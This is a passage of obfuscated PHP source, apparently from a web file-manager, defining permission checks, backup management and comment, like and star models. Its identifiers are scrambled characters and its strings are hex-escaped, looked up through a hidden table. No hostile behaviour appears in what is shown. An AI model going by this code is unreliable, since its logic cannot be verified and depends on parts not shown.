self::AUTH_REMOVE); } public static function authCheckShare($›óÃëú§) { return self::authCheck($›óÃëú§, self::AUTH_SHARE); } public static function authCheckComment($£ç§ó) { return self::authCheck($£ç§ó, self::AUTH_COMMENT); } public static function authCheckEvent($¦ŞÃ‘½Ø) { return self::authCheck($¦ŞÃ‘½Ø, self::AUTH_EVENT); } public static function authCheckRoot($ÁèİóÇ¤) { return self::authCheck($ÁèİóÇ¤, self::AUTH_ROOT); } public static function authCheckAction($ÎÉ Â­Û, $ó§Û¤ë•) { $ÂÍì¦Ê =& $_SERVER[íïàËŸë]; $®­‹îø = array($ÂÍì¦Ê[2000] => self::AUTH_VIEW, $ÂÍì¦Ê[1290] => self::AUTH_DOWNLOAD, $ÂÍì¦Ê[110] => self::AUTH_UPLOAD, $ÂÍì¦Ê[1950] => self::AUTH_EDIT, $ÂÍì¦Ê[1949] => self::AUTH_REMOVE, $ÂÍì¦Ê[1960] => self::AUTH_SHARE, $ÂÍì¦Ê[430] => self::AUTH_COMMENT, $ÂÍì¦Ê[1770] => self::AUTH_EVENT, $ÂÍì¦Ê[2001] => self::AUTH_ROOT); if (!isset($®­‹îø[$ó§Û¤ë•])) { return; } $–¦Ïì¶Ÿ = $®­‹îø[$ó§Û¤ë•]; $ÎÉ Â­Û = intval($ÎÉ Â­Û); if ($ÎÉ Â­Û <= 0) { return !1; } if (($ÎÉ Â­Û & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÎÉ Â­Û & $–¦Ïì¶Ÿ); } public static function authDisable($¥Æú¦, $ëĞĞâ‡‹) { if (intval($¥Æú¦) <= 0) { return 0; } return intval($¥Æú¦) & ~$ëĞĞâ‡‹; } public $optionType = "\123\x79\163\164\145\155\x2e\x73\x6f\x75\162\143\145\101\x75\x74\150\x4c\151\x73\164"; public $field = array("\156\141\x6d\145", "\141\x75\x74\150", "\154\x61\142\145\154", "\144\x69\163\x70\154\x61\171", "\x73\171\x73\164\145\x6d", "\x73\157\x72\x74"); public function initData() { $ëÏ×€şÒ = $this->authDefault(); foreach ($ëÏ×€şÒ as $ëçÎğœÛ) { $this->add($ëçÎğœÛ); } } public function findAuth($÷åÄå, $â¹¯Šşô) { $ÏıÂíÖ­ =& $_SERVER[íïàËŸë]; $ –üçì = parent::listData(); foreach ($ –üçì as $¬•ºÓ¤ô) { $Øû©—ş = intval($¬•ºÓ¤ô[$ÏıÂíÖ­[487]]); if ($Øû©—ş <= 0 || $¬•ºÓ¤ô[$ÏıÂíÖ­[2002]] == 0) { continue; } if (($Øû©—ş & $÷åÄå) != $÷åÄå) { continue; } if (($Øû©—ş & $â¹¯Šşô) != 0) { continue; } return $¬•ºÓ¤ô[$ÏıÂíÖ­[475]]; } return !1; } public function findAuthReadOnly() { $±É®¿Ï = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÔÂ—ÅŠ¯ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($±É®¿Ï, $ÔÂ—ÅŠ¯); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ñ«¥œßÂ =& $_SERVER[íïàËŸë]; $Ñ¤ƒÑĞ” = parent::listData(); $™Ø¯Æûù = !1; foreach ($Ñ¤ƒÑĞ” as $õÔ˜£óã) { if ($õÔ˜£óã[$Ñ«¥œßÂ[487]] <= 0 || $õÔ˜£óã[$Ñ«¥œßÂ[2002]] == $Ñ«¥œßÂ[228]) { continue; } if (!$™Ø¯Æûù) { $™Ø¯Æûù = $õÔ˜£óã; continue; } if ($™Ø¯Æûù[$Ñ«¥œßÂ[487]] > $õÔ˜£óã[$Ñ«¥œßÂ[487]]) { $™Ø¯Æûù = $õÔ˜£óã; } } return $™Ø¯Æûù ? $™Ø¯Æûù[$Ñ«¥œßÂ[475]] : $Ñ«¥œßÂ[12]; } public function listData($å¦ëéÓ² = false, $ÙŞÙ–Á‘ = "\163\157\162\164", $² Ğ­Şä = false) { return parent::listData($å¦ëéÓ², $ÙŞÙ–Á‘, $² Ğ­Şä); } public function update($ïÜİœ„, $‚ŞÔ†¯) { $üÒşÉ¬Ù =& $_SERVER[íïàËŸë]; $Šß¬»³¥ = parent::listData($ïÜİœ„); $–Âõ¨…Ì = $this->findByName($‚ŞÔ†¯[$üÒşÉ¬Ù[32]]); if (!$Šß¬»³¥ || $–Âõ¨…Ì && $–Âõ¨…Ì[$üÒşÉ¬Ù[475]] != $Šß¬»³¥[$üÒşÉ¬Ù[475]]) { return !1; } $this->filterAuth($‚ŞÔ†¯[$üÒşÉ¬Ù[487]]); return parent::update($ïÜİœ„, $‚ŞÔ†¯); } public function remove($¤£Âéºò) { $œÙ³–• = parent::listData($¤£Âéºò); if (!$œÙ³–• || $œÙ³–•[$_SERVER[íïàËŸë][191]]) { return !1; } return parent::remove($¤£Âéºò); } public function add($ÀóĞÖï½ = array()) { $¬¼¸ßíú =& $_SERVER[íïàËŸë]; if ($this->findByName($ÀóĞÖï½[$¬¼¸ßíú[32]])) { return !1; } $èÖùôà® = array($¬¼¸ßíú[32] => $¬¼¸ßíú[12], $¬¼¸ßíú[487] => 1, $¬¼¸ßíú[2003] => $¬¼¸ßíú[1990], $¬¼¸ßíú[2002] => 1, $¬¼¸ßíú[191] => 0, $¬¼¸ßíú[2004] => 0); $ÀóĞÖï½ = array_merge($èÖùôà®, $ÀóĞÖï½); $ÀóĞÖï½[$¬¼¸ßíú[2004]] = $this->getSort(); $this->filterAuth($ÀóĞÖï½[$¬¼¸ßíú[487]]); return parent::insert($ÀóĞÖï½); } private function getSort() { $¤–ã˜®² =& $_SERVER[íïàËŸë]; $›˜ı²äŞ = parent::listData(); $à½¥èğ¹ = array_to_keyvalue($›˜ı²äŞ, $¤–ã˜®²[12], $¤–ã˜®²[2004]); return empty($à½¥èğ¹) ? 0 : max($à½¥èğ¹) + 1; } private function filterAuth(&$çğ¦¡Ë—) { if (!$çğ¦¡Ë—) { return; } $½ï©‹ºš = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ú×ş†ıê = array(); foreach ($½ï©‹ºš as $€‰Ø½Î¨) { if ($çğ¦¡Ë— & $€‰Ø½Î¨) { $Ú×ş†ıê[] = $€‰Ø½Î¨; } } if (in_array(self::AUTH_ROOT, $Ú×ş†ıê)) { $çğ¦¡Ë— = array_sum($½ï©‹ºš); return; } $¡Ú ¸ƒØ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ú×ş†ıê as $€‰Ø½Î¨) { if (isset($¡Ú ¸ƒØ[$€‰Ø½Î¨])) { $Ú×ş†ıê = array_merge($Ú×ş†ıê, $¡Ú ¸ƒØ[$€‰Ø½Î¨]); } } $Ú×ş†ıê[] = self::AUTH_SHOW; $çğ¦¡Ë— = array_sum(array_unique($Ú×ş†ıê)); } public function sort($ñÊ´¬åÕ, $«ú¾Ó¶Û) { return parent::update($ñÊ´¬åÕ, $«ú¾Ó¶Û); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x62\141\143\153\165\160\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\x6e\x61\155\x65", "\x73\x74\x61\164\x75\x73", "\x63\x6f\156\164\145\x6e\164", "\155\x61\156\165\141\154", "\162\x65\163\x75\x6c\164", "\164\x69\x6d\x65\x46\162\157\155", "\164\151\155\145\124\x6f"); public function config() { $¨ÔÁÙüç =& $_SERVER[íïàËŸë]; Action($¨ÔÁÙüç[2005])->taskInit(); $§á£Â• = Model($¨ÔÁÙüç[853])->get($¨ÔÁÙüç[866]); $§á£Â• = json_decode($§á£Â•, !0); $§á£Â• = is_array($§á£Â•) ? $§á£Â• : array(); $this->parseContent($§á£Â•); unset($§á£Â•[$¨ÔÁÙüç[1752]]); Model($¨ÔÁÙüç[1751])->cacheClear(); $Ò–¾Ö‚½ = $¨ÔÁÙüç[2006]; $Î¾ÇéÑ = Model($¨ÔÁÙüç[2007])->findByKey($¨ÔÁÙüç[1770], $Ò–¾Ö‚½); if (!$Î¾ÇéÑ) { $Î¾ÇéÑ = array(); } if (isset($Î¾ÇéÑ[$¨ÔÁÙüç[206]])) { $Î¾ÇéÑ[$¨ÔÁÙüç[206]] = json_decode($Î¾ÇéÑ[$¨ÔÁÙüç[206]], !0); } if (isset($§á£Â•[$¨ÔÁÙüç[206]])) { $Î¾ÇéÑ[$¨ÔÁÙüç[206]][$¨ÔÁÙüç[1755]] = $§á£Â•[$¨ÔÁÙüç[206]]; unset($§á£Â•[$¨ÔÁÙüç[206]]); } return array_merge($Î¾ÇéÑ, $§á£Â•); } public function listData($üÒïÚÙñ = false, $ÂÖ«“²¸ = "\x6d\x6f\x64\151\x66\x79\x54\x69\155\x65", $ÛÖÒŸ’ = false) { $Á÷À­àı = parent::listData($üÒïÚÙñ, $ÂÖ«“²¸, !0); if (!$Á÷À­àı) { return $Á÷À­àı; } if ($üÒïÚÙñ) { $Á÷À­àı = array($Á÷À­àı); } foreach ($Á÷À­àı as &$Š²†Íƒ…) { $this->parseContent($Š²†Íƒ…); } return $üÒïÚÙñ ? $Á÷À­àı[0] : $Á÷À­àı; } public function parseContent(&$“üÔ¯Ğü) { $Ôäñµ¯Ç =& $_SERVER[íïàËŸë]; $ÏÒ’ÄÌ = _get($“üÔ¯Ğü, $Ôäñµ¯Ç[171], $Ôäñµ¯Ç[91]); if (!in_array($ÏÒ’ÄÌ, array($Ôäñµ¯Ç[859], $Ôäñµ¯Ç[1222]))) { $“üÔ¯Ğü[$Ôäñµ¯Ç[171]] = $ÏÒ’ÄÌ == $Ôäñµ¯Ç[91] ? $Ôäñµ¯Ç[1222] : $Ôäñµ¯Ç[859]; } } public function lastItem() { $ãñö™— = $this->listData(); return !empty($ãñö™—[0]) ? $ãñö™—[0] : null; } public function kill($ìÏ¦ï¼ş) { $ÜéŞ±£© =& $_SERVER[íïàËŸë]; $ºéøÇŸñ = $this->listData($ìÏ¦ï¼ş); if (!$ºéøÇŸñ || empty($ºéøÇŸñ[$ÜéŞ±£©[32]])) { return !0; } Task::kill($ÜéŞ±£©[865]); Task::kill($ÜéŞ±£©[883]); Task::kill($ÜéŞ±£©[892]); $Ã…ïÓü = $ºéøÇŸñ[$ÜéŞ±£©[32]]; $¼ğ½³Œ¥ = TEMP_FILES . $ÜéŞ±£©[862] . $Ã…ïÓü . $ÜéŞ±£©[8]; IO::remove($¼ğ½³Œ¥, !1); return $this->remove($ìÏ¦ï¼ş); } public function remove($©Áèçì£) { $±üïÙ²× = $this->listData($©Áèçì£); if (!$±üïÙ²×) { return !0; } return $this->backupRemove($±üïÙ²×); } private function backupRemove($Ô´ Õ•è) { parent::remove($Ô´ Õ•è[$_SERVER[íïàËŸë][475]]); $¬ù“º«³ = $this->backupPath($Ô´ Õ•è); IO::remove($¬ù“º«³, !1); return !0; } private function backupPath($‚ºİÄÇå) { $´Ûüúòê =& $_SERVER[íïàËŸë]; $Äí±Æ¸Ê = $‚ºİÄÇå[$´Ûüúòê[32]]; $‹Ñ˜›×è = Model($´Ûüúòê[853])->get($´Ûüúòê[854]); $îÈ¯³Û = substr(md5($´Ûüúòê[855] . $‹Ñ˜›×è . $Äí±Æ¸Ê), 0, 8); return "\x7b\x69\x6f\x3a{$‚ºİÄÇå[$´Ûüúòê[835]]}\175\x2f\x64\141\164\x61\x62\141\163\x65\x2f\142\x61\x63\153\x75\160\57" . $Äí±Æ¸Ê . $´Ûüúòê[11] . $îÈ¯³Û; } public function start() { $ö“¹Ü’Ä =& $_SERVER[íïàËŸë]; if ($GLOBALS[$ö“¹Ü’Ä[6]][$ö“¹Ü’Ä[92]][$ö“¹Ü’Ä[2008]] != $ö“¹Ü’Ä[91]) { return !0; } $ÕÙ¼Ó×¦ = $this->config(); if (!$ÕÙ¼Ó×¦ || $ÕÙ¼Ó×¦[$ö“¹Ü’Ä[1752]] != $ö“¹Ü’Ä[91]) { return !1; } $Õ‰ü¿çö = $this->process(); foreach ($Õ‰ü¿çö as $Öª•Ó±Ü) { if ($Öª•Ó±Ü) { return Task::restart($Öª•Ó±Ü[$ö“¹Ü’Ä[475]]); } } $ä´®Ü¤± = new Backup(); $ò´ÂªÑ = $ä´®Ü¤±->db(); if ($ò´ÂªÑ) { $ò´ÂªÑ = $ä´®Ü¤±->dbFile(); if ($ò´ÂªÑ && $ÕÙ¼Ó×¦[$ö“¹Ü’Ä[171]] == $ö“¹Ü’Ä[859]) { $ò´ÂªÑ = $ä´®Ü¤±->file(); } } Backup::set(array($ö“¹Ü’Ä[833] => 1, $ö“¹Ü’Ä[844] => time())); return !0; } public function process() { $ÓÍ´åşÜ =& $_SERVER[íïàËŸë]; $¦¦Ï±ÂÎ = array($ÓÍ´åşÜ[840] => Task::get($ÓÍ´åşÜ[865]), $ÓÍ´åşÜ[845] => Task::get($ÓÍ´åşÜ[883]), $ÓÍ´åşÜ[230] => Task::get($ÓÍ´åşÜ[892])); $ÙäÕƒº = !1; foreach ($¦¦Ï±ÂÎ as &$’ü ¸ä±) { if ($ÙäÕƒº) { $’ü ¸ä± = !1; continue; } if ($’ü ¸ä±) { $´ª»ã¾ğ = intval(_get($’ü ¸ä±, $ÓÍ´åşÜ[1787], 0)); if (time() - $´ª»ã¾ğ > 7200) { Task::kill($’ü ¸ä±[$ÓÍ´åşÜ[475]]); $ÙäÕƒº = !0; $’ü ¸ä± = !1; } } } return $¦¦Ï±ÂÎ; } public function restore() { $Ï¸âşò« =& $_SERVER[íïàËŸë]; ActionCall($Ï¸âşò«[1149], !0, 1); ActionCall($Ï¸âşò«[1149], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\x6e\164"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\x6d\145" => "\143\157\155\155\x65\x6e\164\x5f\x6d\145\164\141", "\x6d\145\x74\141\x46\x69\145\154\x64" => "\x63\157\155\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($èòâº§) { $”Âëñ”¡ =& $_SERVER[íïàËŸë]; if ($èòâº§[$”Âëñ”¡[2009]]) { $¨İÃŒ¹æ = $this->where(array($”Âëñ”¡[2010] => $èòâº§[$”Âëñ”¡[2009]]))->find(); if (!$¨İÃŒ¹æ || $¨İÃŒ¹æ[$”Âëñ”¡[190]] != $èòâº§[$”Âëñ”¡[190]] || $¨İÃŒ¹æ[$”Âëñ”¡[569]] != $èòâº§[$”Âëñ”¡[569]]) { return !1; } $this->where(array($”Âëñ”¡[2010] => $èòâº§[$”Âëñ”¡[2009]]))->setAdd($”Âëñ”¡[2011], 1); } $èòâº§[$”Âëñ”¡[2012]] = 0; $èòâº§[$”Âëñ”¡[2011]] = 0; $èòâº§[$”Âëñ”¡[833]] = 1; return $this->add($èòâº§); } public function commentCount($ÛçœÖÎ½, $‚í£ãŞŒ, $Ãöô²£ = false) { $®®Ç„£å =& $_SERVER[íïàËŸë]; if (!$ÛçœÖÎ½) { return array(); } if (is_string($ÛçœÖÎ½) || is_int($ÛçœÖÎ½)) { $ÛçœÖÎ½ = array($ÛçœÖÎ½); } $¡ÄŠÃĞ = array($®®Ç„£å[569], $®®Ç„£å[2013] => $®®Ç„£å[565]); $ÔùêˆÓ» = array($®®Ç„£å[569] => array($®®Ç„£å[7], $ÛçœÖÎ½), $®®Ç„£å[190] => $‚í£ãŞŒ); if ($Ãöô²£) { $ÔùêˆÓ»[$®®Ç„£å[1782]] = $Ãöô²£; } $Ãû°±»³ = $this->field($¡ÄŠÃĞ)->where($ÔùêˆÓ»)->group($®®Ç„£å[569])->select(); return array_to_keyvalue($Ãû°±»³, $®®Ç„£å[569], $®®Ç„£å[565]); } public function starTarget($”¦ÇÅå¯, $¯®ğ«ªÛ) { $„éÃŠ¾ =& $_SERVER[íïàËŸë]; $—¹Ù¯Ø¶ = $”¦ÇÅå¯ + self::TYPE_STAR_OFFSET; $ÁëÌæ = array($„éÃŠ¾[1782] => USER_ID, $„éÃŠ¾[190] => $—¹Ù¯Ø¶, $„éÃŠ¾[569] => $¯®ğ«ªÛ); $°¤÷Ê¿Ó = $this->where($ÁëÌæ)->find(); if ($°¤÷Ê¿Ó) { return $this->where(array($„éÃŠ¾[475] => $°¤÷Ê¿Ó[$„éÃŠ¾[475]]))->delete(); } $Ÿ¾­æ = array($„éÃŠ¾[2009] => 0, $„éÃŠ¾[1782] => USER_ID, $„éÃŠ¾[833] => 1, $„éÃŠ¾[171] => $„éÃŠ¾[12], $„éÃŠ¾[190] => $—¹Ù¯Ø¶, $„éÃŠ¾[569] => $¯®ğ«ªÛ, $„éÃŠ¾[2012] => 0, $„éÃŠ¾[2011] => 0); return $this->add($Ÿ¾­æ); } public function starTargetCount($ĞÎ¿ˆÍï, $öÌì™·œ) { $—ºÀÇŒ¦ =& $_SERVER[íïàËŸë]; $ ğ±É¿ = $öÌì™·œ + self::TYPE_STAR_OFFSET; $˜¶¡Ÿ›¶ = $this->commentCount($ĞÎ¿ˆÍï, $ ğ±É¿); $ı–›À£ƒ = $this->commentCount($ĞÎ¿ˆÍï, $ ğ±É¿, USER_ID); return array($—ºÀÇŒ¦[2014] => $˜¶¡Ÿ›¶, $—ºÀÇŒ¦[2015] => $ı–›À£ƒ); } public function starTargetUserList($ ¬ÓùĞ™, $ÄÀ›ñ) { $‰¶æå Á =& $_SERVER[íïàËŸë]; $×—‚û¨’ = $ ¬ÓùĞ™ + self::TYPE_STAR_OFFSET; $·­›å×‡ = array($‰¶æå Á[569] => $ÄÀ›ñ, $‰¶æå Á[190] => $×—‚û¨’); $¯¦©Á­ = $this->where($·­›å×‡)->count(); $Æ½ƒî‚ô = array($‰¶æå Á[332] => $¯¦©Á­, $‰¶æå Á[2016] => array()); if (!$¯¦©Á­) { return $Æ½ƒî‚ô; } $é¯÷ ‰¹ = $this->field($‰¶æå Á[1782])->where($·­›å×‡)->limit(500)->select(); $é¯÷ ‰¹ = array_to_keyvalue($é¯÷ ‰¹, $‰¶æå Á[12], $‰¶æå Á[1782]); $Æ½ƒî‚ô[$‰¶æå Á[2016]] = Model($‰¶æå Á[577])->userListInfo($é¯÷ ‰¹); return $Æ½ƒî‚ô; } public function prasiseUserList($Ç‡¿ÙÙ™) { $×ËğËí¦ =& $_SERVER[íïàËŸë]; $ˆ›ä¡«‡ = array($×ËğËí¦[2017] => $Ç‡¿ÙÙ™); $ÆÀ€·İÀ = $this->where($ˆ›ä¡«‡)->find(); $÷Ší·Ö = _get($ÆÀ€·İÀ, $×ËğËí¦[2012], 0); $­€ëŞÃÖ = array($×ËğËí¦[332] => $÷Ší·Ö, $×ËğËí¦[2016] => array()); if (!$÷Ší·Ö) { return $­€ëŞÃÖ; } $ÙÕ‡šÑ¼ = Model($×ËğËí¦[2018])->field($×ËğËí¦[1782])->where($ˆ›ä¡«‡)->limit(500)->select(); $ÙÕ‡šÑ¼ = array_to_keyvalue($ÙÕ‡šÑ¼, $×ËğËí¦[12], $×ËğËí¦[1782]); $­€ëŞÃÖ[$×ËğËí¦[2016]] = Model($×ËğËí¦[577])->userListInfo($ÙÕ‡šÑ¼); return $­€ëŞÃÖ; } public function remove($øû“„âå) { $œÀ©ãİ¡ =& $_SERVER[íïàËŸë]; $Î°È–£ = array($œÀ©ãİ¡[2010] => $øû“„âå); $—©Ë£Ÿ = $this->where($Î°È–£)->find(); if ($—©Ë£Ÿ[$œÀ©ãİ¡[2009]]) { $this->where(array($œÀ©ãİ¡[2010] => $—©Ë£Ÿ[$œÀ©ãİ¡[2009]]))->setAdd($œÀ©ãİ¡[2011], -1); } return $this->where($Î°È–£)->delete(); } public function edit($ßûÇ®¦ê, $óöëÍ‰”) { $‚Ô§İ•Ù =& $_SERVER[íïàËŸë]; $¤Èˆ¤÷Ÿ = array($‚Ô§İ•Ù[2010] => $ßûÇ®¦ê); return $this->where($¤Èˆ¤÷Ÿ)->save(array($‚Ô§İ•Ù[2019] => $óöëÍ‰”)); } public function prasise($’õˆôÄ“) { $„²ä’’ß =& $_SERVER[íïàËŸë]; $¼Ô°ËÊ„ = Model($„²ä’’ß[2020]); $¯Öá’ = array($„²ä’’ß[2010] => $’õˆôÄ“, $„²ä’’ß[1773] => USER_ID); $ İ‘›Ô¸ = $¼Ô°ËÊ„->where($¯Öá’)->find(); if (!$ İ‘›Ô¸) { $¼Ô°ËÊ„->add($¯Öá’); $µç² = $this->where(array($„²ä’’ß[2010] => $’õˆôÄ“))->setAdd($„²ä’’ß[2012], 1); } else { $¼Ô°ËÊ„->where($¯Öá’)->delete(); $µç² = $this->where(array($„²ä’’ß[2010] => $’õˆôÄ“))->setAdd($„²ä’’ß[2012], -1); } return $µç²; } public function targetInfo($óÌ¹ÃŞÑ, $ØĞ§‹²†) { $¥Ò¿•Î =& $_SERVER[íïàËŸë]; $ÍÖ§Àµ× = array($¥Ò¿•Î[648] => $óÌ¹ÃŞÑ, $¥Ò¿•Î[649] => $ØĞ§‹²†); $¯Ü¸¨Ö = $this->where($ÍÖ§Àµ×)->count(); $Å«ìéãÊ = "\x52\x49\107\110\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\x74\137\x70\162\x61\151\163\x65\40\x73\x74\x61\x72\40\x6f\x6e\x20\x63\157\x6d\x6d\x65\156\x74\x2e\x63\x6f\155\x6d\145\156\164\x49\104\x20\75\x20\163\164\x61\x72\x2e\x63\x6f\x6d\x6d\x65\x6e\x74\x49\x44"; $Õâø÷­» = $this->alias($¥Ò¿•Î[430])->where($ÍÖ§Àµ×)->join($Å«ìéãÊ, $¥Ò¿•Î[2021])->count(); $Ì›ô£Ê = array($¥Ò¿•Î[2022] => $¯Ü¸¨Ö, $¥Ò¿•Î[2023] => $Õâø÷­»); return $Ì›ô£Ê; } public function listData($»Õ§‚Á) { $©âÊáğ× =& $_SERVER[íïàËŸë]; if (isset($»Õ§‚Á[$©âÊáğ×[2024]])) { if ($»Õ§‚Á[$©âÊáğ×[2024]]) { $»Õ§‚Á[$©âÊáğ×[2017]] = array($©âÊáğ×[1103], intval($»Õ§‚Á[$©âÊáğ×[2024]])); } unset($»Õ§‚Á[$©âÊáğ×[2024]]); } if (isset($»Õ§‚Á[$©âÊáğ×[2025]])) { if ($»Õ§‚Á[$©âÊáğ×[2025]]) { $»Õ§‚Á[$©âÊáğ×[2017]] = array($©âÊáğ×[1100], intval($»Õ§‚Á[$©âÊáğ×[2025]])); } unset($»Õ§‚Á[$©âÊáğ×[2025]]); } return $this->_listData($»Õ§‚Á); } private function _listData($İ ‹éÖ²) { $ÇÛÕÊ¿¬ =& $_SERVER[íïàËŸë]; $Üæõ²úº = $this->where($İ ‹éÖ²)->_makeOrder()->selectPage(100); $this->_listAppendParent($Üæõ²úº[$ÇÛÕÊ¿¬[445]]); $this->_listAppendUser($Üæõ²úº[$ÇÛÕÊ¿¬[445]]); $this->_listAppendMeta($Üæõ²úº[$ÇÛÕÊ¿¬[445]]); return $Üæõ²úº; } private function _makeOrder() { $Š“Ÿı‘ñ =& $_SERVER[íïàËŸë]; $‚“ïÚÖ = array($Š“Ÿı‘ñ[2012], $Š“Ÿı‘ñ[2011], $Š“Ÿı‘ñ[231]); $šøôşåú = Input::get($Š“Ÿı‘ñ[530], $Š“Ÿı‘ñ[7], $Š“Ÿı‘ñ[497], $‚“ïÚÖ); $½äøÉ«É = Input::get($Š“Ÿı‘ñ[531], $Š“Ÿı‘ñ[7], $Š“Ÿı‘ñ[1775], array($Š“Ÿı‘ñ[2026], $Š“Ÿı‘ñ[526])); $æº ¿ö­ = $šøôşåú . $Š“Ÿı‘ñ[53] . $½äøÉ«É; return $this->order($æº ¿ö­); } private function _listAppendParent(&$ó¿ÚßŸ) { $àİ¥¤äŞ =& $_SERVER[íïàËŸë]; $Ûø’º¡Î = array_unique(array_to_keyvalue($ó¿ÚßŸ, $àİ¥¤äŞ[12], $àİ¥¤äŞ[2009])); $Ûø’º¡Î = array_remove_value($Ûø’º¡Î, $àİ¥¤äŞ[228]); if (!$Ûø’º¡Î) { return; } $ÓŠ¥—¹… = $this->where(array($àİ¥¤äŞ[2010] => array($àİ¥¤äŞ[7], $Ûø’º¡Î)))->select(); $ÓŠ¥—¹… = array_to_keyvalue($ÓŠ¥—¹…, $àİ¥¤äŞ[2017]); foreach ($ó¿ÚßŸ as &$‘ãµŒ×Ğ) { if (isset($ÓŠ¥—¹…[$‘ãµŒ×Ğ[$àİ¥¤äŞ[2009]]])) { $‘ãµŒ×Ğ[$àİ¥¤äŞ[2027]] = $ÓŠ¥—¹…[$‘ãµŒ×Ğ[$àİ¥¤äŞ[2009]]]; } } unset($‘ãµŒ×Ğ); } private function _listAppendUser(&$ûì¬õø…) { $ò±õ¦À÷ =& $_SERVER[íïàËŸë]; $ÆÅ¢«œ = array_unique(array_to_keyvalue($ûì¬õø…, $ò±õ¦À÷[12], $ò±õ¦À÷[1782])); $ÆÅ¢«œ = array_remove_value($ÆÅ¢«œ, $ò±õ¦À÷[228]); if (count($ÆÅ¢«œ) == 0) { return; } foreach ($ûì¬õø… as $—êÄ¬ÇÓ) { if (isset($—êÄ¬ÇÓ[$ò±õ¦À÷[2027]])) { $ÆÅ¢«œ[] = $—êÄ¬ÇÓ[$ò±õ¦À÷[2027]][$ò±õ¦À÷[1782]]; } } $“µ˜œÆ = Model($ò±õ¦À÷[598])->userListInfo($ÆÅ¢«œ); foreach ($ûì¬õø… as &$—êÄ¬ÇÓ) { $—êÄ¬ÇÓ[$ò±õ¦À÷[662]] = $“µ˜œÆ[$—êÄ¬ÇÓ[$ò±õ¦À÷[1782]]]; if (isset($—êÄ¬ÇÓ[$ò±õ¦À÷[2027]])) { $—êÄ¬ÇÓ[$ò±õ¦À÷[2027]][$ò±õ¦À÷[662]] = $“µ˜œÆ[$—êÄ¬ÇÓ[$ò±õ¦À÷[2027]][$ò±õ¦À÷[1782]]]; } } unset($—êÄ¬ÇÓ); } private function _listAppendMeta(&$ÀÖ¥™”«) { $²Ô¦ùâ =& $_SERVER[íïàËŸë]; $½Ä´õ¯Ø = array_unique(array_to_keyvalue($ÀÖ¥™”«, $²Ô¦ùâ[12], $²Ô¦ùâ[2017])); $½Ä´õ¯Ø = array_remove_value($½Ä´õ¯Ø, $²Ô¦ùâ[228]); if (!$½Ä´õ¯Ø) { return; } foreach ($ÀÖ¥™”« as $ôÜŸÌÓ¨) { if (isset($ôÜŸÌÓ¨[$²Ô¦ùâ[2027]])) { $½Ä´õ¯Ø[] = $ôÜŸÌÓ¨[$²Ô¦ùâ[2027]][$²Ô¦ùâ[2017]]; } } $¾ÒïÆ¯ = $this->metaList($½Ä´õ¯Ø); if (!$¾ÒïÆ¯) { return !1; } foreach ($ÀÖ¥™”« as &$ôÜŸÌÓ¨) { $ôÜŸÌÓ¨[$²Ô¦ùâ[539]] = $¾ÒïÆ¯[$ôÜŸÌÓ¨[$²Ô¦ùâ[2017]]]; if (isset($ôÜŸÌÓ¨[$²Ô¦ùâ[2027]])) { $ôÜŸÌÓ¨[$²Ô¦ùâ[2027]][$²Ô¦ùâ[539]] = $¾ÒïÆ¯[$ôÜŸÌÓ¨[$²Ô¦ùâ[2027]][$²Ô¦ùâ[2017]]]; } } unset($ôÜŸÌÓ¨); } private function metaList($‚´¤…êé) { $ËßÀÂÔ’ =& $_SERVER[íïàËŸë]; if (!$‚´¤…êé) { return array(); } $¶Ô¸Úö = array($ËßÀÂÔ’[2017] => array($ËßÀÂÔ’[7], $‚´¤…êé)); $…œ…Øõ‹ = Model($ËßÀÂÔ’[2028])->where($¶Ô¸Úö)->select(); $…œ…Øõ‹ = array_to_keyvalue_group($…œ…Øõ‹, $ËßÀÂÔ’[2017]); foreach ($…œ…Øõ‹ as $–Êñƒ¯« => $àúïªÁ) { $ À¥¿î = array(); foreach ($àúïªÁ as $ÔÂ³¹»Ñ) { $ À¥¿î[$ÔÂ³¹»Ñ[$ËßÀÂÔ’[97]]] = $ÔÂ³¹»Ñ[$ËßÀÂÔ’[450]]; } $…œ…Øõ‹[$–Êñƒ¯«] = $ À¥¿î; } return $…œ…Øõ‹ ? $…œ…Øõ‹ : array(); } public function removeTarget($ê¹òš“™, $×ééÛŒı) { $¶ŸºËä° =& $_SERVER[íïàËŸë]; if (!$×ééÛŒı) { return !0; } $×ééÛŒı = is_array($×ééÛŒı) ? $×ééÛŒı : array($×ééÛŒı); $¼íÊ¤¹‡ = array($¶ŸºËä°[190] => $ê¹òš“™, $¶ŸºËä°[569] => array($¶ŸºËä°[7], $×ééÛŒı)); $Éå ±ã½ = $this->field($¶ŸºËä°[2017])->where($¼íÊ¤¹‡)->select(); $—œ …¤ù = array_to_keyvalue($Éå ±ã½, $¶ŸºËä°[12], $¶ŸºËä°[2017]); if (!$—œ …¤ù) { return !0; } $¼íÊ¤¹‡ = array($¶ŸºËä°[2017] => array($¶ŸºËä°[7], $—œ …¤ù)); $this->where($¼íÊ¤¹‡)->delete(); 